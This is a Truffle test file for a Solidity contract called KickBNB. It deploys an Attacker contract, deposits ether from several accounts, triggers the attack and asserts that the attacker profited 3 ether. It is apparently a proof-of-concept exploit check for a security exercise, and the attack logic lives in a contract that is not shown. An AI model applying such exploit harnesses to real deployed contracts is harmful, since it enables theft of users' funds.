const KickBNB = artifacts.require('./KickBNB.sol')
const Attacker = artifacts.require('./Attacker.sol')

contract('KickBNB', async (accounts) => {

    it("should exploit the contract and profit!", async() => {
        let kb = await KickBNB.deployed();
        let att = await Attacker.deployed();
        await att.attacker.call().then(i => evil = i)
        let getbalance = addr => parseInt(web3.fromWei(web3.eth.getBalance(addr).toString()));
        let principal = await getbalance(evil)
        let one = web3.toWei(1, "ether");

        await kb.deposit.sendTransaction({
            from: accounts[1],
            value: one,
            to: kb.address
        });
        await kb.deposit.sendTransaction({
            from: accounts[2],
            value: one,
            to: kb.address
        });
        await att.deposit.sendTransaction({
            from: accounts[1],
            value: one,
            to: att.address
        });
        await att.attack();
        await att.profit();
        profit = await getbalance(evil);
        assert.equal(profit - principal, 3, 'profit failed');
    });
});

